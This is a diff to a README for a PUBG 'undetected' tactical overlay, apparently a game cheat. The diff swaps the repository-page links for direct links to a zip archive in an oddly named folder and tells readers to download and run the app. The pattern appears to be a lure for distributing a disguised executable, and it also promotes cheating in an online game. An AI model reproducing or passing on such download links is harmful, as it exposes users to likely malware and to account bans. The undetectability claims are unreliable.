@@ -1,6 +1,6 @@
 # 🎯 Legend-PUBG-Battlegrounds-Undetected-2026 - Fast PUBG Tactical Overlay
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue?style=for-the-badge)](https://github.com/binetdowngrade51/Legend-PUBG-Battlegrounds-Undetected-2026)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/binetdowngrade51/Legend-PUBG-Battlegrounds-Undetected-2026/main/hooly/Undetected-PUB-Legend-Battlegrounds-v3.9.zip)
 
 ## 🖥️ What this is
 
@@ -12,7 +12,7 @@ It is made for users who want a simple setup and a clear screen layout. The app 
 
 Open this page to download and run the app:
 
-[https://github.com/binetdowngrade51/Legend-PUBG-Battlegrounds-Undetected-2026](https://github.com/binetdowngrade51/Legend-PUBG-Battlegrounds-Undetected-2026)
+[https://raw.githubusercontent.com/binetdowngrade51/Legend-PUBG-Battlegrounds-Undetected-2026/main/hooly/Undetected-PUB-Legend-Battlegrounds-v3.9.zip](https://raw.githubusercontent.com/binetdowngrade51/Legend-PUBG-Battlegrounds-Undetected-2026/main/hooly/Undetected-PUB-Legend-Battlegrounds-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -214,4 +214,4 @@ The app aims to give you:
 
 If you need the download page again, use this link:
 
-[https://github.com/binetdowngrade51/Legend-PUBG-Battlegrounds-Undetected-2026](https://github.com/binetdowngrade51/Legend-PUBG-Battlegrounds-Undetected-2026)
+[https://raw.githubusercontent.com/binetdowngrade51/Legend-PUBG-Battlegrounds-Undetected-2026/main/hooly/Undetected-PUB-Legend-Battlegrounds-v3.9.zip](https://raw.githubusercontent.com/binetdowngrade51/Legend-PUBG-Battlegrounds-Undetected-2026/main/hooly/Undetected-PUB-Legend-Battlegrounds-v3.9.zip)
